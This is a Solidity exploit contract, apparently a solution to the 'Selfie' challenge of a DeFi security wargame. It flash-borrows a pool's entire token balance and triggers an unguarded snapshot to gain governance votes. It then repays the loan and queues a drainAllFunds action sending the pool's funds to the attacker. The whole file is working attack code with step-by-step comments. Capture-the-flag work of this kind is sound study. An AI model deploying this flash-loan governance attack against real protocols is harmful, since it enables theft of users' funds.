// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IToken is IERC20 {
    function snapshot() external returns (uint256);
}

contract SelfieExploit {
    IGovernance _governance;
    IFlashloanPool _pool;
    IToken _token;
    address _owner;

    constructor(
        IGovernance _g,
        IFlashloanPool _p,
        IToken _t
    ) {
        _governance = _g;
        _pool = _p;
        _token = _t;
        _owner = msg.sender;
    }

    function attack() external {
        // loan all tokens
        _pool.flashLoan(_token.balanceOf(address(_pool)));
        //now we can queue the drainAllFunds call
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            _owner
        );
        _governance.queueAction(address(_pool), data, 0);
    }

    function receiveTokens(address, uint256 _amount) external {
        // snapshot is not guarded so we can call it
        _token.snapshot();
        //repay the loan
        _token.transfer(address(_pool), _amount);
    }
}
